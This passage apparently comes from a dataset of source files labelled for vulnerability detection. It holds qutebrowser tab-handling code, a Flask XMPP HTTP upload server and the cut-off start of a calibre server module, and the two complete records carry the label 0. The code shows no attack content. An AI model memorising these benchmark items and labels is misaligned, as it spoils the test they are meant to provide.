new_script.setInjectionPoint(QWebEngineScript.DocumentReady)\n\n            log.greasemonkey.debug('adding script: {}'\n                                   .format(new_script.name()))\n            page_scripts.insert(new_script)\n\n\nclass WebEngineTabPrivate(browsertab.AbstractTabPrivate):\n\n    \"\"\"QtWebEngine-related methods which aren't part of the public API.\"\"\"\n\n    def networkaccessmanager(self):\n        return None\n\n    def user_agent(self):\n        return None\n\n    def clear_ssl_errors(self):\n        raise browsertab.UnsupportedOperationError\n\n    def event_target(self):\n        return self._widget.render_widget()\n\n    def shutdown(self):\n        self._tab.shutting_down.emit()\n        self._tab.action.exit_fullscreen()\n        self._widget.shutdown()\n\n\nclass WebEngineTab(browsertab.AbstractTab):\n\n    \"\"\"A QtWebEngine tab in the browser.\n\n    Signals:\n        abort_questions: Emitted when a new load started or we're shutting\n            down.\n    \"\"\"\n\n    abort_questions = pyqtSignal()\n\n    def __init__(self, *, win_id, mode_manager, private, parent=None):\n        super().__init__(win_id=win_id, private=private, parent=parent)\n        widget = webview.WebEngineView(tabdata=self.data, win_id=win_id,\n                                       private=private)\n        self.history = WebEngineHistory(tab=self)\n        self.scroller = WebEngineScroller(tab=self, parent=self)\n        self.caret = WebEngineCaret(mode_manager=mode_manager,\n                                    tab=self, parent=self)\n        self.zoom = WebEngineZoom(tab=self, parent=self)\n        self.search = WebEngineSearch(tab=self, parent=self)\n        self.printing = WebEnginePrinting(tab=self)\n        self.elements = WebEngineElements(tab=self)\n        self.action = WebEngineAction(tab=self)\n        self.audio = WebEngineAudio(tab=self, parent=self)\n        self.private_api = WebEngineTabPrivate(mode_manager=mode_manager,\n                                               tab=self)\n        self._permissions = _WebEnginePermissions(tab=self, parent=self)\n        self._scripts = _WebEngineScripts(tab=self, parent=self)\n        # We're assigning settings in _set_widget\n        self.settings = webenginesettings.WebEngineSettings(settings=None)\n        self._set_widget(widget)\n        self._connect_signals()\n        self.backend = usertypes.Backend.QtWebEngine\n        self._child_event_filter = None\n        self._saved_zoom = None\n        self._reload_url = None\n        self._scripts.init()\n\n    def _set_widget(self, widget):\n        # pylint: disable=protected-access\n        super()._set_widget(widget)\n        self._permissions._widget = widget\n        self._scripts._widget = widget\n\n    def _install_event_filter(self):\n        fp = self._widget.focusProxy()\n        if fp is not None:\n            fp.installEventFilter(self._tab_event_filter)\n        self._child_event_filter = eventfilter.ChildEventFilter(\n            eventfilter=self._tab_event_filter, widget=self._widget,\n            win_id=self.win_id, parent=self)\n        self._widget.installEventFilter(self._child_event_filter)\n\n    @pyqtSlot()\n    def _restore_zoom(self):\n        if sip.isdeleted(self._widget):\n            # https://github.com/qutebrowser/qutebrowser/issues/3498\n            return\n        if self._saved_zoom is None:\n            return\n        self.zoom.set_factor(self._saved_zoom)\n        self._saved_zoom = None\n\n    def load_url(self, url, *, emit_before_load_started=True):\n        \"\"\"Load the given URL in this tab.\n\n        Arguments:\n            url: The QUrl to load.\n            emit_before_load_started: If set to False, before_load_started is\n                                      not emitted.\n        \"\"\"\n        if sip.isdeleted(self._widget):\n            # https://github.com/qutebrowser/qutebrowser/issues/3896\n            return\n        self._saved_zoom = self.zoom.factor()\n        self._load_url_prepare(\n            url, emit_before_load_started=emit_before_load_started)\n        self._widget.load(url)\n\n    def url(self, *, requested=False):\n        page = self._widget.page()\n        if requested:\n            return page.requestedUrl()\n        else:\n            return page.url()\n\n    def dump_async(self, callback, *, plain=False):\n        if plain:\n            self._widget.page().toPlainText(callback)\n        else:\n            self._widget.page().toHtml(callback)\n\n    def run_js_async(self, code, callback=None, *, world=None):\n        if world is None:\n            world_id = QWebEngineScript.ApplicationWorld\n        elif isinstance(world, int):\n            world_id = world\n            if not 0 <= world_id <= qtutils.MAX_WORLD_ID:\n                raise browsertab.WebTabError(\n                    \"World ID should be between 0 and {}\"\n                    .format(qtutils.MAX_WORLD_ID))\n        else:\n            world_id = _JS_WORLD_MAP[world]\n\n        if callback is None:\n            self._widget.page().runJavaScript(code, world_id)\n        else:\n            self._widget.page().runJavaScript(code, world_id, callback)\n\n    def reload(self, *, force=False):\n        if force:\n            action = QWebEnginePage.ReloadAndBypassCache\n        else:\n            action = QWebEnginePage.Reload\n        self._widget.triggerPageAction(action)\n\n    def stop(self):\n        self._widget.stop()\n\n    def title(self):\n        return self._widget.title()\n\n    def icon(self):\n        return self._widget.icon()\n\n    def set_html(self, html, base_url=QUrl()):\n        # FIXME:qtwebengine\n        # check this and raise an exception if too big:\n        # Warning: The content will be percent encoded before being sent to the\n        # renderer via IPC. This may increase its size. The maximum size of the\n        # percent encoded content is 2 megabytes minus 30 bytes.\n        self._widget.setHtml(html, base_url)\n\n    def _show_error_page(self, url, error):\n        \"\"\"Show an error page in the tab.\"\"\"\n        log.misc.debug(\"Showing error page for {}\".format(error))\n        url_string = url.toDisplayString()\n        error_page = jinja.render(\n            'error.html',\n            title=\"Error loading page: {}\".format(url_string),\n            url=url_string, error=error)\n        self.set_html(error_page)\n\n    @pyqtSlot()\n    def _on_history_trigger(self):\n        try:\n            self._widget.page()\n        except RuntimeError:\n            # Looks like this slot can be triggered on destroyed tabs:\n            # https://crashes.qutebrowser.org/view/3abffbed (Qt 5.9.1)\n            # wrapped C/C++ object of type WebEngineView has been deleted\n            log.misc.debug(\"Ignoring history trigger for destroyed tab\")\n            return\n\n        url = self.url()\n        requested_url = self.url(requested=True)\n\n        # Don't save the title if it's generated from the URL\n        title = self.title()\n        title_url = QUrl(url)\n        title_url.setScheme('')\n        if title == title_url.toDisplayString(QUrl.RemoveScheme).strip('/'):\n            title = \"\"\n\n        # Don't add history entry if the URL is invalid anyways\n        if not url.isValid():\n            log.misc.debug(\"Ignoring invalid URL being added to history\")\n            return\n\n        self.history_item_triggered.emit(url, requested_url, title)\n\n    @pyqtSlot(QUrl, 'QAuthenticator*', 'QString')\n    def _on_proxy_authentication_required(self, url, authenticator,\n                                          proxy_host):\n        \"\"\"Called when a proxy needs authentication.\"\"\"\n        msg = \"<b>{}</b> requires a username and password.\".format(\n            html_utils.escape(proxy_host))\n        urlstr = url.toString(QUrl.RemovePassword | QUrl.FullyEncoded)\n        answer = message.ask(\n            title=\"Proxy authentication required\", text=msg,\n            mode=usertypes.PromptMode.user_pwd,\n            abort_on=[self.abort_questions], url=urlstr)\n        if answer is not None:\n            authenticator.setUser(answer.user)\n            authenticator.setPassword(answer.password)\n        else:\n            try:\n                sip.assign(authenticator, QAuthenticator())\n            except AttributeError:\n                self._show_error_page(url, \"Proxy authentication required\")\n\n    @pyqtSlot(QUrl, 'QAuthenticator*')\n    def _on_authentication_required(self, url, authenticator):\n        log.network.debug(\"Authentication requested for {}, netrc_used {}\"\n                          .format(url.toDisplayString(), self.data.netrc_used))\n\n        netrc_success = False\n        if not self.data.netrc_used:\n            self.data.netrc_used = True\n            netrc_success = shared.netrc_authentication(url, authenticator)\n\n        if not netrc_success:\n            log.network.debug(\"Asking for credentials\")\n            answer = shared.authentication_required(\n                url, authenticator, abort_on=[self.abort_questions])\n        if not netrc_success and answer is None:\n            log.network.debug(\"Aborting auth\")\n            try:\n                sip.assign(authenticator, QAuthenticator())\n            except AttributeError:\n                # WORKAROUND for\n                # https://www.riverbankcomputing.com/pipermail/pyqt/2016-December/038400.html\n                self._show_error_page(url, \"Authentication required\")\n\n    @pyqtSlot()\n    def _on_load_started(self):\n        \"\"\"Clear search when a new load is started if needed.\"\"\"\n        # WORKAROUND for\n        # https://bugreports.qt.io/browse/QTBUG-61506\n        # (seems to be back in later Qt versions as well)\n        self.search.clear()\n        super()._on_load_started()\n        self.data.netrc_used = False\n\n    @pyqtSlot(QWebEnginePage.RenderProcessTerminationStatus, int)\n    def _on_render_process_terminated(self, status, exitcode):\n        \"\"\"Show an error when the renderer process terminated.\"\"\"\n        if (status == QWebEnginePage.AbnormalTerminationStatus and\n                exitcode == 256):\n            # WORKAROUND for https://bugreports.qt.io/browse/QTBUG-58697\n            status = QWebEnginePage.CrashedTerminationStatus\n\n        status_map = {\n            QWebEnginePage.NormalTerminationStatus:\n                browsertab.TerminationStatus.normal,\n            QWebEnginePage.AbnormalTerminationStatus:\n                browsertab.TerminationStatus.abnormal,\n            QWebEnginePage.CrashedTerminationStatus:\n                browsertab.TerminationStatus.crashed,\n            QWebEnginePage.KilledTerminationStatus:\n                browsertab.TerminationStatus.killed,\n            -1:\n                browsertab.TerminationStatus.unknown,\n        }\n        self.renderer_process_terminated.emit(status_map[status], exitcode)\n\n    def _error_page_workaround(self, js_enabled, html):\n        \"\"\"Check if we're displaying a Chromium error page.\n\n        This gets called if we got a loadFinished(False), so we can display at\n        least some error page in situations where Chromium's can't be\n        displayed.\n\n        WORKAROUND for https://bugreports.qt.io/browse/QTBUG-66643\n        WORKAROUND for https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=882805\n\n        Needs to check the page content as a WORKAROUND for\n        https://bugreports.qt.io/browse/QTBUG-66661\n        \"\"\"\n        missing_jst = 'jstProcess(' in html and 'jstProcess=' not in html\n        if js_enabled and not missing_jst:\n            return\n\n        match = re.search(r'\"errorCode\":\"([^\"]*)\"', html)\n        if match is None:\n            return\n        self._show_error_page(self.url(), error=match.group(1))\n\n    @pyqtSlot(int)\n    def _on_load_progress(self, perc: int) -> None:\n        \"\"\"QtWebEngine-specific loadProgress workarounds.\n\n        WORKAROUND for https://bugreports.qt.io/browse/QTBUG-65223\n        \"\"\"\n        super()._on_load_progress(perc)\n        if (perc == 100 and\n                qtutils.version_check('5.10', compiled=False) and\n                self.load_status() != usertypes.LoadStatus.error):\n            self._update_load_status(ok=True)\n\n    @pyqtSlot(bool)\n    def _on_load_finished(self, ok: bool) -> None:\n        \"\"\"QtWebEngine-specific loadFinished workarounds.\"\"\"\n        super()._on_load_finished(ok)\n\n        # WORKAROUND for https://bugreports.qt.io/browse/QTBUG-65223\n        if qtutils.version_check('5.10', compiled=False):\n            if not ok:\n                self._update_load_status(ok)\n        else:\n            self._update_load_status(ok)\n\n        if not ok:\n            self.dump_async(functools.partial(\n                self._error_page_workaround,\n                self.settings.test_attribute('content.javascript.enabled')))\n\n        if ok and self._reload_url is not None:\n            # WORKAROUND for https://bugreports.qt.io/browse/QTBUG-66656\n            log.config.debug(\n                \"Loading {} again because of config change\".format(\n                    self._reload_url.toDisplayString()))\n            QTimer.singleShot(100, functools.partial(\n                self.load_url, self._reload_url,\n                emit_before_load_started=False))\n            self._reload_url = None\n\n    @pyqtSlot(certificateerror.CertificateErrorWrapper)\n    def _on_ssl_errors(self, error):\n        url = error.url()\n        self._insecure_hosts.add(url.host())\n\n        log.webview.debug(\"Certificate error: {}\".format(error))\n\n        if error.is_overridable():\n            error.ignore = shared.ignore_certificate_errors(\n                url, [error], abort_on=[self.abort_questions])\n        else:\n            log.webview.error(\"Non-overridable certificate error: \"\n                              \"{}\".format(error))\n\n        log.webview.debug(\"ignore {}, URL {}, requested {}\".format(\n            error.ignore, url, self.url(requested=True)))\n\n        # WORKAROUND for https://bugreports.qt.io/browse/QTBUG-56207\n        # We can't really know when to show an error page, as the error might\n        # have happened when loading some resource.\n        # However, self.url() is not available yet and the requested URL\n        # might not match the URL we get from the error - so we just apply a\n        # heuristic here.\n        if (not qtutils.version_check('5.9') and\n                not error.ignore and\n                url.matches(self.url(requested=True), QUrl.RemoveScheme)):\n            self._show_error_page(url, str(error))\n\n    @pyqtSlot(QUrl)\n    def _on_before_load_started(self, url):\n        \"\"\"If we know we're going to visit a URL soon, change the settings.\n\n        This is a WORKAROUND for https://bugreports.qt.io/browse/QTBUG-66656\n        \"\"\"\n        super()._on_before_load_started(url)\n        if not qtutils.version_check('5.11.1', compiled=False):\n            self.settings.update_for_url(url)\n\n    @pyqtSlot()\n    def _on_print_requested(self):\n        \"\"\"Slot for window.print() in JS.\"\"\"\n        try:\n            self.printing.show_dialog()\n        except browsertab.WebTabError as e:\n            message.error(str(e))\n\n    @pyqtSlot(usertypes.NavigationRequest)\n    def _on_navigation_request(self, navigation):\n        super()._on_navigation_request(navigation)\n\n        if navigation.url == QUrl('qute://print'):\n            self._on_print_requested()\n            navigation.accepted = False\n\n        if not navigation.accepted or not navigation.is_main_frame:\n            return\n\n        settings_needing_reload = {\n            'content.plugins',\n            'content.javascript.enabled',\n            'content.javascript.can_access_clipboard',\n            'content.print_element_backgrounds',\n            'input.spatial_navigation',\n        }\n        assert settings_needing_reload.issubset(configdata.DATA)\n\n        changed = self.settings.update_for_url(navigation.url)\n        reload_needed = changed & settings_needing_reload\n\n        # On Qt < 5.11, we don't don't need a reload when type == link_clicked.\n        # On Qt 5.11.0, we always need a reload.\n        # On Qt > 5.11.0, we never need a reload:\n        # https://codereview.qt-project.org/#/c/229525/1\n        # WORKAROUND for https://bugreports.qt.io/browse/QTBUG-66656\n        if qtutils.version_check('5.11.1', compiled=False):\n            reload_needed = False\n        elif not qtutils.version_check('5.11.0', exact=True, compiled=False):\n            if navigation.navigation_type == navigation.Type.link_clicked:\n                reload_needed = False\n\n        if reload_needed:\n            self._reload_url = navigation.url\n\n    def _on_select_client_certificate(self, selection):\n        \"\"\"Handle client certificates.\n\n        Currently, we simply pick the first available certificate and show an\n        additional note if there are multiple matches.\n        \"\"\"\n        certificate = selection.certificates()[0]\n        text = ('<b>Subject:</b> {subj}<br/>'\n                '<b>Issuer:</b> {issuer}<br/>'\n                '<b>Serial:</b> {serial}'.format(\n                    subj=html_utils.escape(certificate.subjectDisplayName()),\n                    issuer=html_utils.escape(certificate.issuerDisplayName()),\n                    serial=bytes(certificate.serialNumber()).decode('ascii')))\n        if len(selection.certificates()) > 1:\n            text += ('<br/><br/><b>Note:</b> Multiple matching certificates '\n                     'were found, but certificate selection is not '\n                     'implemented yet!')\n        urlstr = selection.host().host()\n\n        present = message.ask(\n            title='Present client certificate to {}?'.format(urlstr),\n            text=text,\n            mode=usertypes.PromptMode.yesno,\n            abort_on=[self.abort_questions],\n            url=urlstr)\n\n        if present:\n            selection.select(certificate)\n        else:\n            selection.selectNone()\n\n    def _connect_signals(self):\n        view = self._widget\n        page = view.page()\n\n        page.windowCloseRequested.connect(self.window_close_requested)\n        page.linkHovered.connect(self.link_hovered)\n        page.loadProgress.connect(self._on_load_progress)\n        page.loadStarted.connect(self._on_load_started)\n        page.certificate_error.connect(self._on_ssl_errors)\n        page.authenticationRequired.connect(self._on_authentication_required)\n        page.proxyAuthenticationRequired.connect(\n            self._on_proxy_authentication_required)\n        page.contentsSizeChanged.connect(self.contents_size_changed)\n        page.navigation_request.connect(self._on_navigation_request)\n\n        if qtutils.version_check('5.12'):\n            page.printRequested.connect(self._on_print_requested)\n\n        try:\n            # pylint: disable=unused-import\n            from PyQt5.QtWebEngineWidgets import (\n                QWebEngineClientCertificateSelection)\n        except ImportError:\n            pass\n        else:\n            page.selectClientCertificate.connect(\n                self._on_select_client_certificate)\n\n        view.titleChanged.connect(self.title_changed)\n        view.urlChanged.connect(self._on_url_changed)\n        view.renderProcessTerminated.connect(\n            self._on_render_process_terminated)\n        view.iconChanged.connect(self.icon_changed)\n\n        page.loadFinished.connect(self._on_history_trigger)\n        page.loadFinished.connect(self._restore_zoom)\n        page.loadFinished.connect(self._on_load_finished)\n\n        self.before_load_started.connect(self._on_before_load_started)\n        self.shutting_down.connect(self.abort_questions)\n        self.load_started.connect(self.abort_questions)\n\n        # pylint: disable=protected-access\n        self.audio._connect_signals()\n        self._permissions.connect_signals()\n        self._scripts.connect_signals()\n", "target": 0}
{"idx": 1016, "func": "########################################################################\n# File name: xhu.py\n# This file is part of: xmpp-http-upload\n#\n# LICENSE\n#\n# This program is free software: you can redistribute it and/or modify\n# it under the terms of the GNU General Public License as\n# published by the Free Software Foundation, either version 3 of the\n# License, or (at your option) any later version.\n#\n# This program is distributed in the hope that it will be useful, but\n# WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU\n# General Public License for more details.\n#\n# You should have received a copy of the GNU General Public\n# License along with this program.  If not, see\n# <http://www.gnu.org/licenses/>.\n#\n########################################################################\nimport contextlib\nimport errno\nimport fnmatch\nimport json\nimport hashlib\nimport hmac\nimport pathlib\nimport typing\n\nimport flask\nimport werkzeug.exceptions\n\napp = flask.Flask(\"xmpp-http-upload\")\napp.config.from_envvar(\"XMPP_HTTP_UPLOAD_CONFIG\")\napplication = app\n\nif app.config['ENABLE_CORS']:\n    from flask_cors import CORS\n    CORS(app)\n\n\ndef get_paths(root: str, sub_path: str) \\\n        -> typing.Tuple[pathlib.Path, pathlib.Path]:\n    base_path = flask.safe_join(root, sub_path)\n    data_file = pathlib.Path(base_path + \".data\")\n    metadata_file = pathlib.Path(base_path + \".meta\")\n\n    return data_file, metadata_file\n\n\ndef load_metadata(metadata_file):\n    with metadata_file.open(\"r\") as f:\n        return json.load(f)\n\n\ndef get_info(path: str) -> typing.Tuple[\n        pathlib.Path,\n        dict]:\n    data_file, metadata_file = get_paths(app.config[\"DATA_ROOT\"], path)\n\n    return data_file, load_metadata(metadata_file)\n\n\n@contextlib.contextmanager\ndef write_file(at: pathlib.Path):\n    with at.open(\"xb\") as f:\n        try:\n            yield f\n        except:  # NOQA\n            at.unlink()\n            raise\n\n\n@app.route(\"/\")\ndef index():\n    return flask.Response(\n        \"Welcome to XMPP HTTP Upload. State your business.\",\n        mimetype=\"text/plain\",\n    )\n\n\ndef stream_file(src, dest, nbytes):\n    while nbytes > 0:\n        data = src.read(min(nbytes, 4096))\n        if not data:\n            break\n        dest.write(data)\n        nbytes -= len(data)\n\n    if nbytes > 0:\n        raise EOFError\n\n\n@app.route(\"/<path:path>\", methods=[\"PUT\"])\ndef put_file(path):\n    try:\n        data_file, metadata_file = get_paths(app.config[\"DATA_ROOT\"], path)\n    except werkzeug.exceptions.NotFound:\n        return flask.Response(\n            \"Not Found\",\n            404,\n            mimetype=\"text/plain\",\n        )\n\n    verification_key = flask.request.args.get(\"v\", \"\")\n    length = int(flask.request.headers.get(\"Content-Length\", 0))\n    hmac_input = \"{} {}\".format(path, length).encode(\"utf-8\")\n    key = app.config[\"SECRET_KEY\"]\n    mac = hmac.new(key, hmac_input, hashlib.sha256)\n    digest = mac.hexdigest()\n\n    if not hmac.compare_digest(digest, verification_key):\n        return flask.Response(\n            \"Invalid verification key\",\n            403,\n            mimetype=\"text/plain\",\n        )\n\n    content_type = flask.request.headers.get(\n        \"Content-Type\",\n        \"application/octet-stream\",\n    )\n\n    data_file.parent.mkdir(parents=True, exist_ok=True, mode=0o770)\n\n    try:\n        with write_file(data_file) as fout:\n            stream_file(flask.request.stream, fout, length)\n\n            with metadata_file.open(\"x\") as f:\n                json.dump(\n                    {\n                        \"headers\": {\"Content-Type\": content_type},\n                    },\n                    f,\n                )\n    except EOFError:\n        return flask.Response(\n            \"Bad Request\",\n            400,\n            mimetype=\"text/plain\",\n        )\n    except OSError as exc:\n        if exc.errno == errno.EEXIST:\n            return flask.Response(\n                \"Conflict\",\n                409,\n                mimetype=\"text/plain\",\n            )\n        raise\n\n    return flask.Response(\n        \"Created\",\n        201,\n        mimetype=\"text/plain\",\n    )\n\n\ndef generate_headers(response_headers, metadata_headers):\n    for key, value in metadata_headers.items():\n        response_headers[key] = value\n\n    content_type = metadata_headers[\"Content-Type\"]\n    for mimetype_glob in app.config.get(\"NON_ATTACHMENT_MIME_TYPES\", []):\n        if fnmatch.fnmatch(content_type, mimetype_glob):\n            break\n    else:\n        response_headers[\"Content-Disposition\"] = \"attachment\"\n\n    response_headers[\"X-Content-Type-Options\"] = \"nosniff\"\n    response_headers[\"X-Frame-Options\"] = \"DENY\"\n    response_headers[\"Content-Security-Policy\"] = \"default-src 'none'; frame-ancestors 'none'; sandbox\"\n\n\n@app.route(\"/<path:path>\", methods=[\"HEAD\"])\ndef head_file(path):\n    try:\n        data_file, metadata = get_info(path)\n\n        stat = data_file.stat()\n    except (OSError, werkzeug.exceptions.NotFound):\n        return flask.Response(\n            \"Not Found\",\n            404,\n            mimetype=\"text/plain\",\n        )\n\n    response = flask.Response()\n    response.headers[\"Content-Length\"] = str(stat.st_size)\n    generate_headers(\n        response.headers,\n        metadata[\"headers\"],\n    )\n    return response\n\n\n@app.route(\"/<path:path>\", methods=[\"GET\"])\ndef get_file(path):\n    try:\n        data_file, metadata = get_info(path)\n    except (OSError, werkzeug.exceptions.NotFound):\n        return flask.Response(\n            \"Not Found\",\n            404,\n            mimetype=\"text/plain\",\n        )\n\n    response = flask.make_response(flask.send_file(\n        str(data_file),\n    ))\n    generate_headers(\n        response.headers,\n        metadata[\"headers\"],\n    )\n    return response\n", "target": 0}
{"idx": 1017, "func": "#!/usr/bin/env python2\n# vim:fileencoding=utf-8\n# License: GPLv3 Copyright: 2015, Kovid Goyal <kovid at kovidgoyal.net>\n\nfrom __future__ import absolute_import, division, print_function, unicode_literals\n\nimport cPickle\nimport hashlib\nimport random\nimport shutil\nimport sys\nimport zipfile\nfrom json import load as load_json_file\nfrom threading import Lock\n\nfrom calibre import as_unicode\nfrom calibre.customize.ui import available_input_formats\nfrom calibre.db.view import sanitize_sort_field_name\nfrom calibre.srv.ajax import search_result\nfrom calibre.srv.errors import (\n    BookNotFound, HTTPBadRequest, HTTPForbidden, HTTPNotFound\n)\nfrom calibre.srv.metadata import (\n    book_as_json, categories_as_json, categories_settings, icon_map\n)\nfrom calibre.srv.routes import endpoint, json\nfrom calibre.srv.utils import get_library_data, get_use_roman\nfrom calibre.utils.config import prefs, tweaks\nfrom calibre.utils.icu import sort_key\nfrom calibre.utils.localization import get_lang\nfrom calibre.utils.search_query_parser import ParseException\n\nPOSTABLE = frozenset({'GET', 'POST', 'HEAD'})\n\n\n@endpoint('', auth_required=False)\ndef index(ctx, rd):\n    return lopen(P('content-server/index-generated.html'), 'rb')\n\n\n@endpoint('/calibre.appcache', auth_required=False, cache_control='no-cache')\ndef appcache(ctx, rd):\n    return lopen(P('content-server/calibre.appcache'), 'rb')\n\n\n@endpoint('/robots.txt', auth_required=False)\ndef robots(ctx, rd):\n    return b'User-agent: *\\nDisallow: /'\n\n\n@endpoint('/ajax-setup', auth_required=False, cache_control='no-cache', postprocess=json)\ndef ajax_setup(ctx, rd):\n    auto_reload_port = getattr(rd.opts, 'auto_reload_port', 0)\n    return {\n        'auto_reload_port': max(0, auto_reload_port),\n        'allow_console_print': bool(getattr(rd.opts, 'allow_console_print', False)),\n        'ajax_timeout': rd.opts.ajax_timeout,\n    }\n\n\nprint_lock = Lock()\n\n\n@endpoint('/console-print', methods=('POST', ))\ndef console_print(ctx, rd):\n    if not getattr(rd.opts, 'allow_console_print', False):\n        raise HTTPForbidden('console printing is not allowed')\n    with print_lock:\n        print(rd.remote_addr, end=' ')\n        shutil.copyfileobj(rd.request_body_file, sys.stdout)\n    return ''\n\n\ndef get_basic_query_data(ctx, rd):\n    db, library_id, library_map, default_library = get_library_data(ctx, rd)\n    skeys = db.field_metadata.sortable_field_keys()\n    sorts, orders = [], []\n    for x in rd.query.get('sort', '').split(','):\n        if x:\n            s, o = x.rpartition('.')[::2]\n            if o and not s:\n                s, o = o, ''\n            if o not in ('asc', 'desc'):\n                o = 'asc'\n            if s.startswith('_'):\n                s = '#' + s[1:]\n            s = sanitize_sort_field_name(db.field_metadata, s)\n            if s in skeys:\n                sorts.append(s), orders.append(o)\n    if not sorts:\n        sorts, orders = ['timestamp'], ['desc']\n    return library_id, db, sorts, orders, rd.query.get('vl') or ''\n\n\n_cached_translations = None\n\n\ndef get_translations():\n    global _cached_translations\n    if _cached_translations is None:\n        _cached_translations = False\n        with zipfile.ZipFile(\n            P('content-server/locales.zip', allow_user_override=False), 'r'\n        ) as zf:\n            names = set(zf.namelist())\n            lang = get_lang()\n            if lang not in names:\n                xlang = lang.split('_')[0].lower()\n                if xlang in names:\n                    lang = xlang\n            if lang in names:\n                _cached_translations = load_json_file(zf.open(lang, 'r'))\n    return _cached_translations\n\n\ndef custom_list_template():\n    ans = getattr(custom_list_template, 'ans', None)\n    if ans is None:\n        ans = {\n            'thumbnail': True,\n            'thumbnail_height': 140,\n            'height': 'auto',\n            'comments_fields': ['comments'],\n            'lines': [\n                _('<b>{title}</b> by {authors}'),\n                _('{series_index} of <i>{series}</i>') + '|||{rating}',\n                '{tags}',\n                _('Date: {timestamp}') + '|||' + _('Published: {pubdate}') + '|||' + _('Publisher: {publisher}'),\n                '',\n            ]\n        }\n        custom_list_template.ans = ans\n    return ans\n\n\ndef basic_interface_data(ctx, rd):\n    ans = {\n        'username': rd.username,\n        'output_format': prefs['output_format'].upper(),\n        'input_formats': {x.upper(): True\n                          for x in available_input_formats()},\n        'gui_pubdate_display_format': tweaks['gui_pubdate_display_format'],\n        'gui_timestamp_display_format': tweaks['gui_timestamp_display_format'],\n        'gui_last_modified_display_format': tweaks['gui_last_modified_display_format'],\n        'use_roman_numerals_for_series_number': get_use_roman(),\n        'translations': get_translations(),\n        'icon_map': icon_map(),\n        'icon_path': ctx.url_for('/icon', which=''),\n        'custom_list_template': getattr(ctx, 'custom_list_template', None) or custom_list_template(),\n        'num_per_page': rd.opts.num_per_page,\n    }\n    ans['library_map'], ans['default_library_id'] = ctx.library_info(rd)\n    return ans\n\n\n@endpoint('/interface-data/update', postprocess=json)\ndef update_interface_data(ctx, rd):\n    '''\n    Return the interface data needed for the server UI\n    '''\n    return basic_interface_data(ctx, rd)\n\n\ndef get_field_list(db):\n    fieldlist = list(db.pref('book_display_fields', ()))\n    names = frozenset([x[0] for x in fieldlist])\n    available = frozenset(db.field_metadata.displayable_field_keys())\n    for field in available:\n        if field not in names:\n            fieldlist.append((field, True))\n    return [f for f, d in fieldlist if d and f in available]\n\n\ndef get_library_init_data(ctx, rd, db, num, sorts, orders, vl):\n    ans = {}\n    with db.safe_read_lock:\n        try:\n            ans['search_result'] = search_result(\n                ctx, rd, db,\n                rd.query.get('search', ''), num, 0, ','.join(sorts),\n                ','.join(orders), vl\n            )\n        except ParseException:\n            ans['search_result'] = search_result(\n                ctx, rd, db, '', num, 0, ','.join(sorts), ','.join(orders), vl\n            )\n        sf = db.field_metadata.ui_sortable_field_keys()\n        sf.pop('ondevice', None)\n        ans['sortable_fields'] = sorted(\n            ((sanitize_sort_field_name(db.field_metadata, k), v)\n             for k, v in sf.iteritems()),\n            key=lambda (field, name): sort_key(name)\n        )\n        ans['field_metadata'] = db.field_metadata.all_metadata()\n        ans['virtual_libraries'] = db._pref('virtual_libraries', {})\n        ans['book_display_fields'] = get_field_list(db)\n        mdata = ans['metadata'] = {}\n        try:\n            extra_books = set(\n                int(x) for x in rd.query.get('extra_books', '').split(',')\n            )\n        except Exception:\n            extra_books = ()\n        for coll in (ans['search_result']['book_ids'], extra_books):\n            for book_id in coll:\n                if book_id not in mdata:\n                    data = book_as_json(db, book_id)\n                    if data is not None:\n                        mdata[book_id] = data\n    return ans\n\n\n@endpoint('/interface-data/books-init', postprocess=json)\ndef books(ctx, rd):\n    '''\n    Get data to create list of books\n\n    Optional: ?num=50&sort=timestamp.desc&library_id=<default library>\n              &search=''&extra_books=''&vl=''\n    '''\n    ans = {}\n    try:\n        num = int(rd.query.get('num', rd.opts.num_per_page))\n    except Exception:\n        raise HTTPNotFound('Invalid number of books: %r' % rd.query.get('num'))\n    library_id, db, sorts, orders, vl = get_basic_query_data(ctx, rd)\n    ans = get_library_init_data(ctx, rd, db, num, sorts, orders, vl)\n    ans['library_id'] = library_id\n    return ans\n\n\n@endpoint('/interface-data/init', postprocess=json)\ndef interface_data(ctx, rd):\n    '''\n    Return the data needed to create the server UI as well as a list of books.\n\n    Optional: ?num=50&sort=timestamp.desc&library_id=<default library>\n              &search=''&extra_books=''&vl=''\n    '''\n    ans = basic_interface_data(ctx, rd)\n    ud = {}\n    if rd.username:\n        # Override session data with stored values for the authenticated user,\n        # if any\n        ud = ctx.user_manager.get_session_data(rd.username)\n        lid = ud.get('library_id')\n        if lid and lid in ans['library_map']:\n            rd.query.set('library_id', lid)\n        usort = ud.get('sort')\n        if usort:\n            rd.query.set('sort', usort)\n    ans['library_id'], db, sorts, orders, vl = get_basic_query_data(ctx, rd)\n    ans['user_session_data'] = ud\n    try:\n        num = int(rd.query.get('num', rd.opts.num_per_page))\n    except Exception:\n        raise HTTPNotFound('Invalid number of books: %r' % rd.query.get('num'))\n    ans.update(get_library_init_data(ctx, rd, db, num, sorts, orders, vl))\n    return ans\n\n\n@endpoint('/interface-data/more-books', postprocess=json, methods=POSTABLE)\ndef more_books(ctx, rd):\n    '''\n    Get more results from the specified search-query, which must\n    be specified as JSON in the request body.\n\n    Optional: ?num=50&library_id=<default library>\n    '''\n    db, library_id = get_library_data(ctx, rd)[:2]\n\n    try:\n        num = int(rd.query.get('num', rd.opts.num_per_page))\n    except Exception:\n        raise HTTPNotFound('Invalid number of books: %r' % rd.query.get('num'))\n    try:\n        search_query = load_json_file(rd.request_body_file)\n        query, offset, sorts, orders, vl = search_query['query'], search_query[\n            'offset'\n        ], search_query['sort'], search_query['sort_order'], search_query['vl']\n    except KeyError as err:\n        raise HTTPBadRequest('Search query missing key: %s' % as_unicode(err))\n    except Exception as err:\n        raise HTTPBadRequest('Invalid query: %s' % as_unicode(err))\n    ans = {}\n    with db.safe_read_lock:\n        ans['search_result'] = search_result(\n            ctx, rd, db, query, num, offset, sorts, orders, vl\n        )\n        mdata = ans['metadata'] = {}\n        for book_id in ans['search_result']['book_ids']:\n            data = book_as_json(db, book_id)\n            if data is not None:\n                mdata[book_id] = data\n\n    return ans\n\n\n@endpoint('/interface-data/set-session-data', postprocess=json, methods=POSTABLE)\ndef set_session_data(ctx, rd):\n    '''\n    Store session data persistently so that it is propagated automatically to\n    new logged in clients\n    '''\n    if rd.username:\n        try:\n            new_data = load_json_file(rd.request_body_file)\n            if not 